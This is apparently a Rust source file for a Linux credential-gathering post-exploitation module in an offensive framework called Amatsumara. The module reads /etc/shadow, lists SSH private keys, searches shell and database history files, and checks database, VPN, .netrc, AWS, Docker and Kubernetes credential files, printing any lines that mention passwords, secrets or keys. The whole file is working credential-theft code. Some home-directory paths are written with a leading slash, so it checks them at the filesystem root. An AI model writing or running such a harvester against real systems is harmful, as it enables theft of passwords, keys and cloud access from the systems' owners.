///! Linux Credential Gathering Post-Exploitation Module

use amatsumara_api::*;
use std::os::raw::{c_char, c_int, c_void};
use serde::Deserialize;
use std::ffi::CStr;
use std::fs;
use std::path::Path;

static NAME: &str = "Linux Credential Gathering";
static DESCRIPTION: &str = "Extract credentials from common locations";
static AUTHOR: &str = "Amatsumara Project";
static PLATFORMS: &[Platform] = &[Platform::Linux];
static ARCHS: &[Arch] = &[Arch::X64, Arch::X86, Arch::ARM];

static OPTIONS: &[ModuleOption] = &[];

static MODULE_INFO: ModuleInfo = ModuleInfo {
    api_version: MODULE_API_VERSION,
    metadata: ModuleMetadata {
        name: CString { ptr: NAME.as_ptr() as *const c_char, len: NAME.len() },
        description: CString { ptr: DESCRIPTION.as_ptr() as *const c_char, len: DESCRIPTION.len() },
        author: CString { ptr: AUTHOR.as_ptr() as *const c_char, len: AUTHOR.len() },
        module_type: ModuleType::Post,
        platforms: PlatformArray { ptr: PLATFORMS.as_ptr(), len: PLATFORMS.len() },
        archs: ArchArray { ptr: ARCHS.as_ptr(), len: ARCHS.len() },
        ranking: Ranking::Normal,
        privileged: false,
    },
    options: OptionArray { ptr: OPTIONS.as_ptr(), len: OPTIONS.len() },
};

static VTABLE: ModuleVTable = ModuleVTable { get_info, init, destroy, check: None, run };
struct ModuleInstance { _dummy: u8 }

#[derive(Deserialize, Debug)]
struct PostOptions {}

extern "C" fn get_info() -> *const ModuleInfo { &MODULE_INFO }
extern "C" fn init() -> *mut c_void { Box::into_raw(Box::new(ModuleInstance { _dummy: 0 })) as *mut c_void }
extern "C" fn destroy(instance: *mut c_void) { if !instance.is_null() { unsafe { let _ = Box::from_raw(instance as *mut ModuleInstance); } } }

extern "C" fn run(_instance: *mut c_void, _config: *const c_char) -> c_int {
    println!("[*] Gathering credentials...\n");

    // Shadow file (requires root)
    println!("[+] Checking /etc/shadow:");
    check_file("/etc/shadow");

    // SSH keys
    println!("\n[+] Searching for SSH keys:");
    find_ssh_keys();

    // History files
    println!("\n[+] Checking shell history:");
    check_history_files();

    // Database configuration files
    println!("\n[+] Checking database configs:");
    let db_paths = vec![
        "/etc/mysql/my.cnf",
        "/etc/postgresql/postgresql.conf",
        "/var/www/html/wp-config.php",
        "/var/www/html/config/database.yml",
    ];
    for path in db_paths {
        check_file(path);
    }

    // Application configs
    println!("\n[+] Checking application configs:");
    let app_paths = vec![
        "/etc/openvpn",
        "/etc/stunnel",
        "/etc/ppp",
        "/.netrc",
    ];
    for path in app_paths {
        check_file(path);
    }

    // Browser saved passwords (requires specific tools)
    println!("\n[+] Common credential locations:");
    check_file("/.aws/credentials");
    check_file("/.docker/config.json");
    check_file("/.kube/config");

    println!("\n[*] Credential gathering complete!");
    0
}

fn check_file(path: &str) {
    let full_path = if path.starts_with('/') {
        path.to_string()
    } else if path.starts_with("~/") {
        format!("{}/{}", std::env::var("HOME").unwrap_or_default(), &path[2..])
    } else {
        format!("{}/{}", std::env::var("HOME").unwrap_or_default(), path)
    };

    match fs::metadata(&full_path) {
        Ok(metadata) => {
            if metadata.is_file() {
                println!("  [FOUND] {}", full_path);
                if let Ok(contents) = fs::read_to_string(&full_path) {
                    let lines: Vec<&str> = contents.lines().take(10).collect();
                    for line in lines {
                        if line.contains("password") || line.contains("secret") || line.contains("key") {
                            println!("    {}", line);
                        }
                    }
                }
            } else if metadata.is_dir() {
                println!("  [DIR] {}", full_path);
            }
        }
        Err(_) => {}
    }
}

fn find_ssh_keys() {
    if let Ok(home) = std::env::var("HOME") {
        let ssh_dir = format!("{}/.ssh", home);
        if let Ok(entries) = fs::read_dir(ssh_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Some(name) = path.file_name() {
                    let name_str = name.to_string_lossy();
                    if name_str.contains("id_") || name_str.contains("_key") {
                        println!("  [FOUND] {:?}", path);
                    }
                }
            }
        }
    }
}

fn check_history_files() {
    if let Ok(home) = std::env::var("HOME") {
        let history_files = vec![
            format!("{}/.bash_history", home),
            format!("{}/.zsh_history", home),
            format!("{}/.mysql_history", home),
            format!("{}/.psql_history", home),
        ];

        for hist_file in history_files {
            if Path::new(&hist_file).exists() {
                println!("  [FOUND] {}", hist_file);
                if let Ok(contents) = fs::read_to_string(&hist_file) {
                    for line in contents.lines().take(50) {
                        if line.contains("password") || line.contains("passwd") ||
                           line.contains("secret") || line.contains("key=") {
                            println!("    {}", line);
                        }
                    }
                }
            }
        }
    }
}

fn parse_options(config: *const c_char) -> Result<PostOptions, Box<dyn std::error::Error>> {
    if config.is_null() {
        return Ok(PostOptions {});
    }
    Ok(serde_json::from_str(unsafe { CStr::from_ptr(config).to_str()? })?)
}

#[no_mangle]
pub extern "C" fn amatsumara_module_init() -> *const ModuleVTable { &VTABLE }
